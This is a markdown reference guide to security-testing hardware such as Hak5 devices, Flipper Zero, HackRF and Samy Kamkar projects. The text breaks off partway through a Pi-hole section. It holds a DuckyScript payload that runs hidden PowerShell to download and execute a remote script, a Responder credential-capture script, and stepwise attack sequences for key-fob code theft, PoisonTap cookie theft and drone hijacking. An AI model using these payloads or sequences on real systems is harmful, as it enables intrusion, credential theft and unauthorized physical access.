# SECURITY GADGETS REFERENCE

> **Professional cybersecurity reference covering security-focused hardware gadgets, maker tools, and DIY security devices.**
>
> All information is provided for authorized security research, penetration testing, and educational purposes only. Always obtain explicit written authorization before testing on any systems you do not own. Unauthorized use of these tools may violate the Computer Fraud and Abuse Act (18 U.S.C. § 1030), FCC regulations, and other applicable laws.

| | |
|---|---|
| **Read this when** | Scoping an authorized wireless, RF, RFID, or hardware assessment and choosing the right gadget, standing up an isolated home lab or RF test bench, confirming the legal boundaries before you power on a transmitter |
| **Start at** | [Hak5 Ecosystem](#_1-hak5-ecosystem), [Flipper Zero](#_3-flipper-zero), [Lab Setup, Legal & Community](#_10-lab-setup-legal-amp-community) |
| **Pairs with** | [WIRELESS_SECURITY_REFERENCE.md](WIRELESS_SECURITY_REFERENCE.md), [RED_TEAM_REFERENCE.md](RED_TEAM_REFERENCE.md), [disciplines/radio-frequency-security.md](disciplines/radio-frequency-security.md), [disciplines/hardware-security.md](disciplines/hardware-security.md) |

---

## Table of Contents

1. [Hak5 Ecosystem](#_1-hak5-ecosystem)
2. [Great Scott Gadgets](#_2-great-scott-gadgets)
3. [Flipper Zero](#_3-flipper-zero)
4. [Samy Kamkar Projects](#_4-samy-kamkar-projects)
5. [Pi-hole & DNS Security Appliances](#_5-pi-hole-amp-dns-security-appliances)
6. [Mesh Radio Networks](#_6-mesh-radio-networks)
7. [Raspberry Pi Security Projects](#_7-raspberry-pi-security-projects)
8. [RFID & Hardware Attack Tools](#_8-rfid-amp-hardware-attack-tools)
9. [Maker & DIY Security Tools](#_9-maker-amp-diy-security-tools)
10. [Lab Setup, Legal & Community](#_10-lab-setup-legal-amp-community)

---

## 1. Hak5 Ecosystem

Hak5 produces a professional-grade line of penetration testing hardware used by security researchers, red team operators, and authorized network assessors. All devices are designed and sold for authorized security testing only.

### 1.1 WiFi Pineapple Mark VII

The WiFi Pineapple Mark VII is a dual-radio 802.11 a/b/g/n/ac platform designed for wireless security assessments. It runs a custom OpenWrt-based firmware with a web-based management interface.

**Core Modules:**

- **PineAP** — The primary rogue access point engine. Broadcasts SSIDs harvested from probe requests, enabling authorized testing of client association behavior. Configurable beacon interval, TX power, and MAC address.
- **Evil Portal** — Captive portal module for authorized phishing simulations. Supports custom HTML/PHP portal pages, credential logging, and automatic client redirection.
- **SSLsplit** — Transparent TLS/SSL proxy for authorized MITM assessments. Intercepts encrypted sessions and logs plaintext for analysis.
- **DNSspoof** — DNS spoofing module for authorized redirect testing. Maps queried hostnames to attacker-controlled IPs.
- **REST API** — Full device management via JSON REST API. Enables scripted automation of campaigns, module control, and log retrieval.
- **Cloud C2 Integration** — Remote management via Hak5's Cloud C2 platform. Supports device tunneling, payload deployment, and loot retrieval over internet-routed connections.

**WiFi Coconut** — A companion device featuring 14 simultaneous 2.4 GHz radios, enabling full-band 802.11 capture across all channels simultaneously. Used with Kismet for comprehensive wireless spectrum monitoring during authorized assessments.

**Operational workflow:**
```
1. Connect to Pineapple management AP (172.16.42.1)
2. Configure PineAP: enable beacon flood, set SSID pool
3. Activate Evil Portal with custom landing page
4. Monitor associations in real-time via dashboard
5. Retrieve loot via Cloud C2 or local web UI
```

### 1.2 USB Rubber Ducky

The USB Rubber Ducky is a keystroke injection tool that presents as a USB HID keyboard, executing scripted payloads at machine speed the moment it is plugged in.

**DuckyScript Language:**

| Command | Description | Example |
|---------|-------------|---------|
| `DELAY` | Wait in milliseconds | `DELAY 1000` |
| `STRING` | Type literal text | `STRING Hello World` |
| `ENTER` | Press Enter key | `ENTER` |
| `GUI` | Windows/Super key combo | `GUI r` |
| `ALT` | Alt key combo | `ALT F4` |
| `CTRL` | Control key combo | `CTRL c` |
| `SHIFT` | Shift key combo | `SHIFT F10` |
| `REM` | Comment line | `REM This is a comment` |
| `REPEAT` | Repeat previous line | `REPEAT 5` |
| `DEFAULT_DELAY` | Set global delay | `DEFAULT_DELAY 100` |

**Example payload — open Run dialog and execute command:**
```ducky
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 800
STRING Invoke-WebRequest -Uri http://192.168.1.10/stage.ps1 -OutFile $env:TEMP\s.ps1; & $env:TEMP\s.ps1
ENTER
```

**Twin Duck Firmware** — Modified firmware enabling simultaneous HID and mass storage modes. The device appears as both a keyboard and a USB flash drive, allowing payload delivery combined with file exfiltration.

**Payload Studio** — Browser-based IDE at payloadstudio.hak5.org for authoring, testing, and encoding DuckyScript payloads. Features syntax highlighting, error checking, and direct device flashing.

**Community Payloads:** `github.com/hak5/usbrubberducky-payloads` — curated repository of community-contributed payloads organized by OS and attack category.

### 1.3 Bash Bunny

The Bash Bunny is a multi-function USB attack platform running a full Debian Linux environment, capable of appearing as various USB device types simultaneously.

**ATTACKMODE Configuration:**

```bash
# Appear as HID keyboard + mass storage
ATTACKMODE HID STORAGE

# Appear as Ethernet adapter (Linux RNDIS) + HID
ATTACKMODE RNDIS_ETHERNET HID

# Appear as Ethernet adapter (ECM, macOS/Linux) + storage
ATTACKMODE ECM_ETHERNET STORAGE

# Pure HID mode
ATTACKMODE HID
```

**Bunny Script structure:**
```bash
#!/bin/bash
# payloads/switch1/payload.sh
ATTACKMODE RNDIS_ETHERNET HID

# Wait for network
while ! ip route | grep -q default; do sleep 1; done

# Run responder for credential capture (authorized testing)
cd /tools/responder
python Responder.py -I usb0 -wrf

# Exfiltrate loot
cp /tmp/Responder-Session.log /root/udisk/loot/
```

**Pre-installed tools:** `responder`, `nmap`, `impacket`, `metasploit` (framework), `tcpdump`, `python3`, `curl`, `wget`

**LED Status Codes:**

| Color/Pattern | Meaning |
|--------------|---------|
| Solid Red | Booting |
| Flashing Red | Arming mode |
| Solid Amber | Standby |
| Flashing Green | Attack running |
| Solid Blue | Finished |
| Flashing Magenta | Error |

**Switch positions:** Switch 1, Switch 2 (attack payloads), Switch 3 (arming mode for payload editing via mass storage).

### 1.4 Shark Jack

The Shark Jack is an inline network attack tool designed to auto-execute payloads when connected to a live network port.

- Runs **OpenWrt** on internal MIPS processor
- **Auto-attack on plug** — configured payload executes immediately upon detecting link-up
- **Loot storage** — internal storage for captured credentials, scan results, and network data
- **Cloud C2** integration for remote payload delivery and loot retrieval
- Built-in **nmap** for rapid network reconnaissance
- Battery-powered for untethered deployment
- RJ45 jack doubles as charging interface

**Example payload:**
```bash
#!/bin/bash
# Network recon on plug
nmap -sn $(ip route | grep -oP '\d+\.\d+\.\d+\.\d+/\d+' | head -1) -oX /root/loot/hosts.xml
nmap -sV -O $(cat /root/loot/hosts.xml | grep -oP 'addr="\K[^"]+') -oN /root/loot/services.txt
```

### 1.5 LAN Turtle

The LAN Turtle is a covert USB Ethernet adapter that provides persistent remote access and network intelligence gathering when deployed in authorized environments.

- **USB Ethernet disguise** — appears as a standard USB Ethernet adapter to the host OS
- Runs **OpenWrt** with modular architecture
- **Available modules:**
  - `autossh` — persistent reverse SSH tunnel to remote server
  - `meterpreter` — Metasploit Meterpreter reverse shell
  - `responder` — SMB/HTTP credential harvesting (authorized)
  - `nmap` — network scanning and discovery
  - `Cloud C2` — Hak5 remote management integration
  - `DNSspoof` — local DNS manipulation
  - `Mitmf` — man-in-the-middle framework
- Powered entirely by host USB port — no external power required
- Web-based module management interface via SSH tunnel

### 1.6 Packet Squirrel

The Packet Squirrel is a transparent Layer 2 network tap and MITM device designed for authorized inline network monitoring.

- **Layer 2 transparent tap** — passes traffic without disrupting network communication
- **Inline deployment** — sits between two network devices, invisible to both
- Runs **OpenWrt** with configurable payloads
- **4-position payload switch** for field-selectable attack modes
- **Built-in tools:** `tcpdump`, `nmap`, `openvpn`, `dnsspoof`
- **VPN mode** — routes captured traffic through encrypted tunnel for remote analysis
- **DNS spoofing** mode — modifies DNS responses in-flight for authorized redirect testing
- Loot written to USB mass storage
- Passive monitoring mode for no-modification traffic capture

**Capture example:**
```bash
tcpdump -i eth0 -w /root/udisk/capture-$(date +%Y%m%d-%H%M%S).pcap
```

### 1.7 Key Croc

The Key Croc is a USB keyboard pass-through implant that captures keystrokes and can inject HID payloads triggered by specific keywords.

- **USB keyboard pass-through** — the connected keyboard continues to function normally
- **Loot logger** — captures all keystrokes to local storage
- **Keyword-triggered HID injection** — monitors keystroke stream for defined trigger words, then injects DuckyScript payload
- Built-in **WiFi** for remote C2 communication
- **Cloud C2** integration for remote management
- Runs Debian Linux with Python support

**Keyword trigger example:**
```
WHEN [any] CONTAINS "cmd" EXECUTE payload.txt
```

### 1.8 O.MG Cable

The O.MG Cable is a USB cable with an embedded WiFi-enabled microcontroller, visually indistinguishable from standard charging cables.

**Available variants:**
- Lightning to USB-A
- USB-A to USB-A
- USB-C to USB-C and cross-variants

**Capabilities:**
- **WiFi AP** — device creates its own WiFi access point for remote operator control
- **DuckyScript** execution — full keystroke injection capability
- **Geofencing** — payloads activate or deactivate based on GPS/WiFi location triggers
- **Self-destruct** — remote wipe of all payload data to prevent forensic recovery
- **Keystroke exfiltration** — logs keystrokes over WiFi in real-time
- Web-based control panel accessible via connected WiFi

### 1.9 Screen Crab

The Screen Crab is an inline HDMI capture device for authorized video signal monitoring.

- Passes HDMI signal transparently between source and display
- Captures screen content to **microSD card** at configurable frame rates
- **WiFi exfiltration** — streams or uploads captures to remote server
- Powered by HDMI's 5V supply line or USB-C auxiliary
- Used in authorized physical security assessments for screen content capture

### 1.10 Cloud C2

Hak5's **Cloud C2** is a self-hosted remote management platform for centrally managing all Hak5 devices in authorized deployments.

- Unified dashboard for WiFi Pineapple, Bash Bunny, LAN Turtle, Shark Jack, Key Croc, Packet Squirrel
- **Device tunneling** — establishes outbound connections through NAT/firewall for remote access
- **Payload delivery** — push and execute payloads on deployed devices
- **Loot retrieval** — centralized collection of captured data from all devices
- Self-hosted on VPS or local server: `./c2-3.0.0_amd64_linux -hostname yourdomain.com -https`
- REST API for automation and SIEM integration

---
## 2. Great Scott Gadgets

Great Scott Gadgets develops open-source hardware for RF and hardware security research. All designs are fully open-source (hardware and firmware), enabling independent verification and modification.

### 2.1 HackRF One

The HackRF One is a software-defined radio peripheral supporting half-duplex transmit and receive across an extremely wide frequency range.

**Hardware specifications:**
- **Frequency range:** 1 MHz - 6 GHz
- **Sample rate:** 20 Msps (20 million samples per second)
- **ADC resolution:** 8-bit
- **Duplex:** Half-duplex (transmit OR receive, not simultaneous)
- **Interface:** USB 2.0 High Speed
- **Form factor:** Open-source hardware, SMA antenna connector

**Essential CLI commands:**

```bash
# Identify connected HackRF device
hackrf_info

# Receive and capture to file at 433.92 MHz (ISM band)
hackrf_transfer -r capture.bin -f 433920000 -s 2000000 -l 40 -g 20

# Transmit from file at 433.92 MHz (REQUIRES FCC LICENSE OR AUTHORIZED TESTING)
hackrf_transfer -t payload.bin -f 433920000 -s 2000000 -x 40

# Sweep spectrum from 2.4 to 2.5 GHz, log to file
hackrf_sweep -f 2400:2500 -l 40 -g 20 -N 1 -B -w sweep.bin

# Continuous spectrum sweep output
hackrf_sweep -f 100:6000 -l 16 -g 0 -n 8192

# OOK transmission example (raw binary)
hackrf_transfer -t ook_signal.bin -f 315000000 -s 2000000 -x 47 -a 1
```

**GNU Radio integration:**
```python
# Basic HackRF source in GNU Radio Python
from gnuradio import gr
from gnuradio import blocks
import osmosdr

class HackRFReceiver(gr.top_block):
    def __init__(self, freq=433.92e6, samp_rate=2e6):
        gr.top_block.__init__(self)
        self.src = osmosdr.source(args="hackrf=0")
        self.src.set_sample_rate(samp_rate)
        self.src.set_center_freq(freq)
        self.src.set_gain(40)
        self.sink = blocks.file_sink(gr.sizeof_gr_complex, "capture.cf32")
        self.connect(self.src, self.sink)
```

**Portapack H2 + Mayhem Firmware:**

The Portapack H2 is a companion screen/battery/controls module that attaches to the HackRF One, creating a standalone (no-computer-required) SDR platform.

Mayhem firmware (`github.com/portapack-mayhem/mayhem-firmware`) features:
- **Spectrum Analyzer** — real-time waterfall display across any frequency range
- **Receiver** — AM/FM/SSB/DSB/WFM demodulation with audio output
- **Transmitter** — replay captured signals, custom waveforms
- **Jammer Detector** — identifies broadband noise sources (for authorized RF testing)
- **POCSAG Decoder** — decodes paging system transmissions
- **ADS-B Receiver** — aircraft transponder tracking and display
- **BTLE Receiver** — Bluetooth Low Energy packet capture
- **Weather Station Receiver** — 433 MHz ISM band sensor decoding
- **Sub-GHz replay** — capture and replay remote controls and sensors
- **GPS Simulator** — GPS satellite signal simulation (requires authorization and RF shielding)

### 2.2 YARD Stick One

The YARD Stick One is a Sub-GHz radio transceiver based on the TI CC1111 SoC, designed for ISM band protocol analysis and authorized testing.

**Specifications:**
- **Frequency range:** 300 - 928 MHz (Sub-GHz ISM bands)
- **Chipset:** Texas Instruments CC1111
- **Modulations:** OOK, ASK, 2-FSK, GFSK, MSK
- **Interface:** USB
- **Library:** rfcat Python library

**rfcat usage:**

```python
from rfcat import RfCat
from rfcat import MOD_ASK_OOK, MOD_2FSK, MOD_GFSK, MOD_MSK

d = RfCat()

# Configure for 433.92 MHz OOK (common for ISM sensors/remotes)
d.setFreq(433920000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmSyncMode(0)          # No sync word
d.setMdmDRate(4800)          # 4800 baud data rate
d.setMaxPower()

# Receive packets
d.setModeRX()
pkt, ts = d.RFrecv()
print(pkt.encode('hex'))

# Transmit raw data (REQUIRES AUTHORIZATION)
data = b'\xAA\x55\xAA\x55'
d.RFxmit(data)

# Spectrum sweep
d.specan(433000000)          # Launch spectrum analyzer

# Reset device
d.cleanup()
```

**ISM band frequency reference:**

| Band | Frequency | Common Uses |
|------|-----------|-------------|
| 315 MHz | 314-316 MHz | US car key fobs, garage doors |
| 433 MHz | 433.05-434.79 MHz | European ISM, sensors, remotes |
| 868 MHz | 868-870 MHz | European wireless devices |
| 915 MHz | 902-928 MHz | US ISM, LoRa, Z-Wave |

### 2.3 Ubertooth One

The Ubertooth One is an open-source Bluetooth monitoring platform providing promiscuous capture capability for both Classic Bluetooth (BR/EDR) and Bluetooth Low Energy (BLE).

**Specifications:**
- **Frequency:** 2.4 GHz ISM band (2402-2480 MHz)
- **Chipset:** Texas Instruments CC2400
- **Interface:** USB
- **Protocol support:** BR/EDR (Classic Bluetooth), BLE (Bluetooth Low Energy)

**Commands:**

```bash
# Capture BLE advertising packets to pcap
ubertooth-btle -f -c capture_ble.pcap

# Follow a specific BLE connection (requires initial packet capture)
ubertooth-btle -f -A 37 -c conn_capture.pcap

# Classic Bluetooth LAP discovery
ubertooth-rx

# Pipe to Wireshark for live analysis
ubertooth-btle -f -p | wireshark -k -i -

# Kismet integration — add Ubertooth as Bluetooth source
# In kismet.conf:
# source=ubertooth-0:name=ubertooth

# Crack BLE pairing keys with crackle (requires capture with CONNECT_IND)
crackle -i pairing_capture.pcap -o decrypted.pcap
```

**Bluetooth security research applications:**
- Authorized device enumeration and fingerprinting
- BLE advertisement monitoring for IoT device discovery
- BLE MITM setup for authorized protocol analysis
- PIN cracking for legacy Bluetooth pairing (authorized testing)
- Sniffing unencrypted Classic Bluetooth audio streams

### 2.4 GreatFET One

The GreatFET One is a versatile hardware hacking Swiss army knife based on the NXP LPC4330 dual-core ARM processor.

**Specifications:**
- **Processor:** NXP LPC4330 (ARM Cortex-M4 + M0)
- **Interface:** USB 2.0 High Speed
- **GPIO:** 40-pin expansion headers compatible with Raspberry Pi HATs
- **Special capability:** Can operate as USB host and USB device simultaneously
- **Neighbor boards:** Modular expansion boards (JTAG, SPI flash, ADC, DAC, etc.)

**Python API:**

```python
from greatfet import GreatFET

gf = GreatFET()

# I2C operations
i2c = gf.i2c
devices = i2c.scan()  # Scan for I2C devices

# SPI operations
spi = gf.spi
data = spi.transfer([0x9F, 0x00, 0x00, 0x00])  # Read JEDEC ID

# GPIO control
gpio = gf.gpio
gpio.setup('J1_P5', gpio.OUT)
gpio.output('J1_P5', True)

# USB analysis via Facedancer integration
from facedancer import FacedancerUSBApp
```

**FaceDancer functionality (USB fuzzing):**
```python
# Emulate a USB device for fuzzing and analysis
from facedancer import FacedancerUSBApp
from facedancer.USBDevice import USBDevice
# Define custom USB device descriptors for fuzzing
```

### 2.5 Throwing Star LAN Tap

The Throwing Star LAN Tap is a passive, unpowered network monitoring device for capturing 100BASE-TX Ethernet traffic.

- **Completely passive** — requires no power, introduces no traffic
- Splits receive (RX) pairs from both sides to two monitoring ports
- Rated for **100 Mbps** only (100BASE-TX); does not support Gigabit
- Plugs between two Ethernet devices (e.g., workstation and switch)
- Monitor ports output receive-only traffic (one direction per port)
- Use a NIC in promiscuous mode on each monitor port, or combine with a hub for full-duplex capture
- Perfect for network forensics and authorized traffic analysis

```
Device A --[TX->]--[<-RX]-- LAN Tap --[TX->]--[<-RX]-- Device B
                                 |
                            Monitor Ports
                           /           \
                     Monitor 1      Monitor 2
                 (Device A TX)   (Device B TX)
```

---
## 3. Flipper Zero

Flipper Zero is a portable multi-tool for security researchers, combining radio, RFID, NFC, infrared, GPIO, and BadUSB capabilities in a compact, dolphin-themed handheld device.

### 3.1 Hardware Overview

**Core specifications:**

| Component | Details |
|-----------|---------|
| MCU | STM32WB55 (ARM Cortex-M4 @ 64 MHz + M0+ for radio) |
| Display | 128x64 monochrome LCD |
| Input | 5-direction joystick + back button |
| Battery | 2000 mAh Li-Po (approximately 30 days standby) |
| USB | USB-C (serial/DFU/BadUSB) |
| Storage | MicroSD card slot |
| GPIO | 18-pin 0.1" header (SPI, I2C, UART, 1-Wire, power) |
| Sub-GHz | CC1101 transceiver (300-928 MHz) |
| 125 kHz RFID | Internal antenna + EM4100 compatible reader/writer |
| NFC | ST25R3916 (ISO 14443-A/B, ISO 15693) |
| Infrared | IR LED + receiver |
| iButton | 1-Wire contact pad |
| Bluetooth | 5.4 LE (via STM32WB radio co-processor) |

### 3.2 Sub-GHz Radio

Flipper's Sub-GHz module uses the TI CC1101 chip to receive, decode, save, and replay fixed-code radio signals in the 300-928 MHz range.

**Supported frequencies:**
- 315 MHz, 390 MHz (US/Japan)
- 433.92 MHz (EU/worldwide ISM)
- 868.35 MHz, 915 MHz (regional)

**Supported protocols:**

| Protocol | Description |
|----------|-------------|
| AM270 / AM650 | OOK modulations |
| FM238 / FM476 | FSK modulations |
| Princeton | Common fixed-code remote chips |
| Came | Italian gate/barrier brand |
| Chamberlain | US garage door opener brand |
| Holtek | Common remote cloning chips |
| CAME | Rolling code (can capture, cannot replay without key) |
| KeeLoq | Rolling code algorithm (vulnerable to certain attacks) |

**Sub-GHz file format (.sub):**
```
Filetype: Flipper SubGhz Key File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: Princeton
Bit: 24
Key: 00 00 00 00 00 AB CD 12
```

**Frequency analyzer** mode displays signal power across the Sub-GHz spectrum in real-time, enabling quick identification of active frequencies.

**RAW capture and replay:** Records the raw OOK/FSK waveform without protocol decoding — useful for protocols Flipper does not natively support. Replays the exact recorded waveform.

**Region unlock:** Default firmware enforces regional frequency restrictions. Community firmware (Unleashed, Momentum) removes these restrictions for testing in authorized environments.

### 3.3 RFID and NFC

**125 kHz RFID (Low Frequency):**

| Card Type | Read | Write | Emulate |
|-----------|------|-------|---------|
| EM4100 | Yes | No | Yes |
| HID Prox | Yes | No | Yes |
| Indala | Yes | No | Yes |
| EM4305 | Yes | Yes | Yes |
| T5577 | Yes | Yes | Yes |

**13.56 MHz NFC (High Frequency):**

| Card Type | Read | Write | Emulate |
|-----------|------|-------|---------|
| Mifare Classic 1K/4K | Yes* | Yes* | Yes |
| Mifare Ultralight | Yes | Yes | Yes |
| NTAG213/215/216 | Yes | Yes | Yes |
| iCLASS Legacy | Yes | No | Yes |
| EMV (bank cards) | Read only (PAN, expiry) | No | No |

*Mifare Classic requires knowing the sector keys. Flipper supports nested authentication attacks to recover unknown keys from a partially known card.

**NFC dictionary attack:** Flipper can perform nested authentication attacks against Mifare Classic cards, attempting to recover all sector keys using known keys as a starting point. Community firmware expands the built-in key dictionary.

**RFID file format (.rfid):**
```
Filetype: Flipper RFID key
Version: 1
Key type: EM4100
Data: 01 23 45 67 89
```

### 3.4 BadUSB

Flipper Zero presents as a USB HID keyboard when connected to a host, executing DuckyScript 1.0 payloads from the MicroSD card.

**Compatibility:** Windows, macOS, Linux, Android (USB OTG)

**DuckyScript example (Windows reverse shell launcher):**
```ducky
DELAY 3000
GUI r
DELAY 500
STRING powershell -W Hidden -EP Bypass -NoP
ENTER
DELAY 1000
STRING Start-Process cmd -ArgumentList '/c whoami > C:\temp\out.txt' -WindowStyle Hidden
ENTER
```

**Payload storage:** `/SD Card/badusb/` — `.txt` files with DuckyScript syntax

**Key limitations vs. USB Rubber Ducky:** No multi-stage delivery (single script only), limited to DuckyScript 1.0 syntax, type speed may vary by OS language/layout.

### 3.5 Infrared

Flipper Zero includes an IR transmitter and receiver for universal remote control functionality.

- **Learn** — captures IR signals from existing remotes (NEC, RC5, RC6, SIRC, and raw protocols)
- **Replay** — retransmits captured signals
- **IRDB** — community-maintained IR code database for TVs, projectors, A/V receivers, and smart home devices
- **Universal remote** — pre-loaded codes for major TV brands
- RAW capture mode for non-standard protocols

**Community IRDB:** `github.com/Lucaslhm/Flipper-IRDB` — thousands of device code files in `.ir` format

### 3.6 iButton (1-Wire)

Flipper reads and emulates Dallas/Maxim iButton keys (DS1990A, DS1992) used in physical access control systems. The contact pad on the bottom of Flipper makes direct contact with iButton reader sockets.

### 3.7 Firmware Ecosystem

| Firmware | Key Features |
|----------|-------------|
| **Official** | Stable, region-compliant, frequent updates |
| **Unleashed** | Region unlock, extra Sub-GHz protocols, extended RFID support |
| **RogueMaster** | Unleashed base + additional apps, visual tweaks |
| **Momentum** | Performance-focused, clean UI, curated app store |

**GPIO WiFi Dev Board:** An ESP32-based add-on connecting to Flipper's GPIO header. Running the **Marauder** firmware, it enables:
- WiFi network scanning
- Authorized deauthentication frame testing
- Evil twin AP setup
- Beacon flood testing
- Packet capture (PCAP)

**Flipper App Marketplace:** `lab.flipper.net/apps` — community applications including games, tools, and protocol analyzers installable via Flipper Mobile App.

**Community resources:**
- `github.com/djsime1/awesome-flipperzero` — curated resources list
- `github.com/UberGuidoZ/Flipper` — payload and file repository
- `flipper-zero-tutorials` — video and written guides

---
## 4. Samy Kamkar Projects

Samy Kamkar is a security researcher and prolific creator of open-source hardware/software security projects. All projects are published for educational and authorized security research purposes.

### 4.1 MagSpoof

MagSpoof wirelessly emulates any magnetic stripe card without physical contact by generating an electromagnetic field that mimics the card's data encoding.

**Hardware:** ATmega microcontroller + H-bridge motor driver + coil (approximately 25 turns of 30 AWG magnet wire)

**How it works:**
1. Data is encoded in the magnetic field using F2F (frequency/double frequency) encoding
2. The H-bridge rapidly switches current direction through the coil
3. The resulting alternating magnetic field is read by standard mag-stripe readers
4. Works at close range (1-3 cm) without any physical card present

**Security research relevance:**
- Demonstrates the weakness of magnetic stripe authentication
- Tests reader compatibility and sensitivity
- Can disable the chip requirement on some readers that fall back to swipe
- Exposes the lack of cryptographic protection on Track 1/2/3 data

**Open-source:** `github.com/samyk/magspoof`

### 4.2 RollJam

RollJam exploits a critical vulnerability in rolling code (KeeLoq) systems used by many car key fobs and garage door openers from manufacturers including GM, Chrysler, Volkswagen, and others.

**Attack sequence:**
1. **Jam + Capture #1:** When the vehicle owner presses their key fob, RollJam simultaneously jams the signal (preventing the car from receiving it) and captures the rolling code
2. **Jam + Capture #2:** Owner presses again (assumes malfunction) — device captures second rolling code while continuing to jam
3. **Replay #1:** Immediately replays the first captured code — car unlocks (owner satisfied)
4. **Hold #2:** Second captured code is valid but unused — stored for future replay when attacker needs unauthorized access

**Why this works:** Rolling code systems advance their counter on each use. By capturing two codes and using the first, the attacker holds a still-valid future code.

**Hardware options:**
- HackRF One (broadband SDR)
- YARD Stick One (Sub-GHz dedicated)
- Custom PCB with dual CC1101 chips (simultaneous jam/receive)

**Mitigations:** Unidirectional rolling code with time-based expiry, bi-directional challenge-response authentication (not present in most consumer vehicles).

**Open-source:** `github.com/samyk/rolljam`

### 4.3 OpenSesame

OpenSesame is a brute-force tool targeting garage door openers that use fixed (non-rolling) codes.

**Attack parameters:**
- Code space: 2^12 = 4,096 possible codes (older systems) or 2^9 = 512 (some models)
- Transmission rate: approximately 10 ms per code attempt
- Total time for exhaustive search: approximately 40 seconds
- Target: Fixed-code garage door openers (pre-rolling-code era, still common)

**Platform:** HackRF One transmitting OOK-modulated signals at the target frequency (300 MHz, 310 MHz, or 315 MHz depending on the opener).

**Defense:** All modern openers should use rolling codes. Fixed-code systems should be replaced.

### 4.4 SkyJack

SkyJack is a drone hijacking proof-of-concept demonstrating the security vulnerability in the Parrot AR.Drone's unauthenticated WiFi control protocol.

**Components:**
- Raspberry Pi (any model)
- Two wireless network adapters (one for scanning/deauth, one for connecting)
- Node.js control software
- `aircrack-ng` suite

**Attack sequence:**
1. Scan 2.4 GHz spectrum for Parrot AR.Drone access points (SSID: `ardrone2_XXXXXX`)
2. Identify connected controller (phone/tablet) MAC address
3. Deauthenticate the legitimate controller from the drone's AP
4. Connect SkyJack to the now-ownerless drone
5. Send control commands via Node.js to assume full control

**Security lesson:** Consumer drones lacked authentication between controller and aircraft. Demonstrated the importance of mutual authentication in wireless control systems.

**Open-source:** `github.com/samyk/skyjack`

### 4.5 PoisonTap

PoisonTap exploits browser caching and USB network adapter auto-configuration to siphon cookies and install persistent backdoors, even on locked computers.

**Hardware:** Raspberry Pi Zero + USB OTG cable

**Attack sequence:**
1. Plug PoisonTap into locked/unattended computer
2. OS auto-configures Pi Zero as USB Ethernet adapter (RNDIS/ECM)
3. Pi claims to be the default gateway for all IP ranges
4. Background browser tabs make HTTP requests — PoisonTap intercepts them
5. Cookies from Alexa top 1,000,000 websites are captured
6. Browser cache is poisoned with a persistent service worker that:
   - Intercepts all future HTTP requests to those domains
   - Installs WebSocket backdoor accessible over the internet

**Why it works on locked computers:**
- Many browsers continue making HTTP requests in the background even when the screen is locked
- OS USB network stack configures new adapters without user interaction
- Service workers persist across browser restarts

**Mitigations:** Full-disk encryption alone does not protect against this (OS still auto-configures USB). Disable USB networking on locked workstations, use HTTPS-only browsing, deploy Content-Security-Policy headers.

**Open-source:** `github.com/samyk/poisontap`

### 4.6 KeySweeper

KeySweeper is a covert Microsoft wireless keyboard sniffer disguised as a USB wall charger.

**Hardware:** Arduino + nRF24L01+ 2.4 GHz radio module + USB phone charger enclosure

**How it works:**
- Microsoft's 2.4 GHz wireless keyboards (pre-2011 models) transmit keystrokes unencrypted using a simple proprietary protocol
- nRF24L01+ can operate in promiscuous mode to scan all 2.4 GHz channels
- Keystrokes are decoded and logged

**Data exfiltration options:**
- MicroSD card local storage (retrieved when physically collecting device)
- SMS via cellular module (SIM800L) — sends keystroke logs to attacker's phone
- WiFi upload to remote server

**Defense:** Use Bluetooth keyboards with encryption, or wired keyboards in sensitive environments. Microsoft's newer wireless keyboards use AES encryption.

**Open-source:** `github.com/samyk/keysweeper`

### 4.7 USBdriveby

USBdriveby uses a Teensy microcontroller to install a backdoor and override DNS settings on a locked Mac in seconds.

**Hardware:** Teensy 2.0 or 3.x

**Capabilities demonstrated:**
- HID injection on locked macOS (screen lock can be bypassed via HID while active)
- DNS override via `networksetup` commands
- Backdoor installation with persistence

**Research value:** Demonstrates that screen locks without firmware/OS-level USB blocking cannot prevent HID-based attacks.

### 4.8 Evercookie

Evercookie is a JavaScript API demonstrating extreme browser tracking persistence by storing identifying data in 20+ browser storage locations simultaneously.

**Storage mechanisms used:**
- Standard cookies
- Local Storage
- Session Storage
- IndexedDB
- Web SQL Database
- Filesystem API
- ETag / Last-Modified headers (server-side caching)
- History API color sniffing
- PNG pixel caching in canvas
- Flash Local Shared Objects (legacy)
- Silverlight Isolated Storage (legacy)
- HTTP authentication caching
- window.name persistence
- CSS visited link history

**Security research relevance:** Demonstrates that clearing cookies is insufficient for privacy. Exposes browser architecture weaknesses that enable cross-site tracking. Influenced browser privacy improvements in modern engines.

**Open-source:** `github.com/samyk/evercookie`

### 4.9 XSS Worm — Historical Reference

In 2005, Samy Kamkar created the first self-propagating XSS worm on MySpace, which infected over one million profiles in approximately 20 hours. The worm demonstrated:

- Self-replicating XSS vulnerabilities at scale
- The impact of cross-site scripting on social platforms
- The need for output encoding and Content-Security-Policy

This event is considered a watershed moment in web application security history, leading to improved XSS defenses across the industry. Kamkar subsequently cooperated with authorities and the vulnerability was remediated.

---
## 5. Pi-hole & DNS Security Appliances

DNS-level filtering is one of the most effective and efficient methods for network-wide threat blocking. These tools leverage DNS interception to block malicious domains before connections are established.

### 5.1 Pi-hole Fundamentals

Pi-hole is a network-wide DNS sinkhole that blocks advertisements and malicious domains for all devices on the network by acting as the DNS resolver.

**Core architecture:**
- **FTLDNS** — Fork of `dnsmasq` modified for Pi-hole's enhanced query logging and blocking. "Faster Than Light" DNS (FTL) processes queries with minimal overhead.
- **Admin interface** — Web UI at `http://pi.hole/admin` (or `http://[Pi-IP]/admin`) providing real-time query graphs, top blocked domains, per-client statistics.
- **Blocklist management** — Aggregates multiple blocklist sources into a unified `gravity.db` SQLite database.
- **Query logging** — All DNS queries logged to SQLite database for retrospective analysis.

**Query flow:**
```
Client -> Pi-hole DNS:53 -> Check gravity.db -> [BLOCKED] -> Return 0.0.0.0/::
                                              -> [ALLOWED] -> Forward to upstream DNS -> Return answer
```

### 5.2 Installation

**Standard installation (Raspberry Pi OS / Debian / Ubuntu):**
```bash
curl -sSL https://install.pi-hole.net | bash
# Interactive installer, sets static IP, selects upstream DNS, configures blocklists
```

**Docker deployment:**
```bash
docker run -d \
  --name pihole \
  --network host \
  -e TZ="America/New_York" \
  -e WEBPASSWORD="your_secure_password" \
  -e PIHOLE_DNS_1="9.9.9.9" \
